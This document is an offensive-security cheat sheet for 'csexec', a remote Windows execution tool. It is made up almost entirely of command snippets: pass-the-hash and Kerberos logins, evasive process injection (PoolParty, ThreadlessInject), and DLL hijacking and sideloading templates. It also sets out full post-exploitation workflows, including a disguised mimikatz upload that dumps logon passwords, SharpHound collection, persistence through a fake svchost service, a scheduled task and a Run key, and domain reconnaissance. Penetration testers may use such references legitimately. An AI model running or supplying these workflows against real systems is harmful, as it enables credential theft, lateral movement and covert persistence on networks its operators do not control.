# csexec

% csexec, powershell, execution

## CSExec - Basic interactive session
```
python csexec.py <user>:<password>@<ip>
```

## CSExec - Execute single command
```
python csexec.py <user>:<password>@<ip> <command>
```

## CSExec - Domain authentication
```
python csexec.py <domain>/<user>:<password>@<target>
```

## CSExec - Domain with FQDN target
```
python csexec.py <domain>/<user>:'<password>'@<target>.<domain>
```

## CSExec - Pass-the-Hash authentication
```
python csexec.py <user>@<ip> -hashes :<ntlm_hash>
```

## CSExec - Pass-the-Hash with domain
```
python csexec.py <domain>/<user>@<target> -hashes :<ntlm_hash>
```

## CSExec - Kerberos authentication
```
python csexec.py <user>@<domain> -k -dc-ip <dc_ip>
```

## CSExec - Specify session ID
```
python csexec.py <user>:<password>@<target> -session <session_id>
```

## CSExec - Use action template (DLL hijacking)
```
python csexec.py -a <template_path> <user>:<password>@<target>
```

## CSExec - Action template with domain authentication
```
python csexec.py -a <template_path> <domain>/<user>:'<password>'@<target>.<domain>
```

## CSExec - Use action template (DLL sideloading)
```
python csexec.py -a templates/action_teams_sideload.yaml <user>:<password>@<target>
```

## CSExec - Direct DLL execution via rundll32
```
python csexec.py -a templates/action_rundll32_direct.yaml <user>:<password>@<target>
```

## CSExec - PoolParty injection method
```
python csexec.py -m PoolParty <user>:<password>@<ip>
```

## CSExec - PoolPartyModuleStomping (shorthand)
```
python csexec.py -m ppstomp <user>:<password>@<ip>
```

## CSExec - ThreadlessInject (evasive)
```
python csexec.py -m ThreadlessInject <user>:<password>@<ip>
```

## CSExec - Custom pipe name
```
python csexec.py <user>:<password>@<target> --pipename <pipe_name>
```

## CSExec - Fire and forget (no pipe communication)
```
python csexec.py <user>:<password>@<target> --no-pipe
```

## CSExec - Debug mode with verbose output
```
python csexec.py <user>:<password>@<target> --debug
```

## CSExec - Custom share name
```
python csexec.py <user>:<password>@<target> -share <share_name>
```

## CSExec - Save session state
```
python csexec.py <user>:<password>@<target> --save-state <session_file>
```

## CSExec - Restore saved session
```
python csexec.py --restore-state <session_file>
```

## CSExec - List named pipes
```
python csexec.py <user>:<password>@<target> --list-pipes
```

## Download files from target to local
```
lget <remote_path> <local_path>
```

## Upload files from local to target
```
lput <local_path> <remote_path>
```

## Remove file on target
```
rm <file_path>
```

## Create directory on target
```
mkdir <directory_path>
```

## Remove directory on target
```
rmdir <directory_path>
```

## List directory contents
```
ls <directory_path>
```

## Change directory
```
cd <directory_path>
```

## Kill process by name
```
taskkill <process_name>
```

## List processes
```
ps
```

## List user sessions
```
qwinsta
```

## List named pipes
```
pipes
```

## Get system information
```
systeminfo
```

## Get current user info
```
whoami /all
```

## CSExec - Credential harvesting workflow
```
python csexec.py <user>:<password>@<ip>
PS> lput <mimikatz_path> C:\Users\Public\debug.exe
PS> C:\Users\Public\debug.exe "sekurlsa::logonpasswords" "exit"
PS> rm C:\Users\Public\debug.exe
```

## CSExec - Bloodhound collection
```
python csexec.py <user>:<password>@<target>
PS> lput <sharphound_path> C:\Users\Public\collector.exe
PS> C:\Users\Public\collector.exe -c All --zipfilename bh_data.zip
PS> lget C:\Users\Public\bh_data.zip <local_output_path>
```

## CSExec - Persistence via service
```
python csexec.py <user>:<password>@<target>
PS> lput <backdoor_path> C:\Windows\System32\svchost2.exe
PS> New-Service -Name "<service_name>" -BinaryPathName "C:\Windows\System32\svchost2.exe" -StartupType Automatic
PS> Start-Service <service_name>
```

## CSExec - Persistence via scheduled task
```
python csexec.py <user>:<password>@<target>
PS> lput <payload_path> C:\Users\Public\updater.exe
PS> $action = New-ScheduledTaskAction -Execute "C:\Users\Public\updater.exe"
PS> $trigger = New-ScheduledTaskTrigger -Daily -At <time>
PS> Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "<task_name>"
```

## CSExec - Registry persistence
```
New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "<entry_name>" -Value "<executable_path>"
```

## CSExec - Network discovery
```
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"}
Get-SmbShare
net view \\<computer_name>
```

## CSExec - Domain reconnaissance workflow
```
python csexec.py <domain>/<user>:'<password>'@<dc_name>.<domain>
PS> Get-ADComputer -Filter * | Select Name
PS> Get-ADUser -Filter * | Select SamAccountName
PS> Get-ADGroup -Filter * | Select Name
```

## CSExec - Troubleshooting pipe failures
```
python csexec.py -m RemoteThreadContext <user>:<password>@<target>
```

## CSExec - Troubleshooting DLL hijacking failures
```
python csexec.py -a templates/action_urlmon_write.yaml <user>:<password>@<target>
```

## CSExec - Troubleshooting authentication issues
```
python csexec.py <domain>/<user>:<password>@<target>
python csexec.py <user>:<password>@<ip> -share ADMIN$
python csexec.py <domain>/<user>:'<password>'@<target>.<domain> -share C$
```